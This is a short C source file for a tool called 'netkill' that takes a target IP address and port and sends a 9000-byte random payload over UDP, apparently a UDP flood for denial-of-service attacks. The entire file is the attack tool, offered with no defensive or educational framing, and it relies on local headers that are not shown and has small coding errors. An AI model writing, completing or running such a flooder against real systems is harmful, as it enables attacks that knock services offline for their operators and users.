// All local
#include <rand.h>
#include <networking.h>


int main(int argc, const char** argv)
{
    // Check if system arguments are acceptable
    if (argc != 3)
    {
        printf("Usage:       netkill [IP address (Must be IP Address, not hostname!)] [port]\n");
        return -1;
    }

    int port = atoi(argv[2]);
    unsigned char* payload_buffer = nk_rand_bytes(9000);


    udp_stream(&argv[1], port, (char**)&payload_buffer);
}

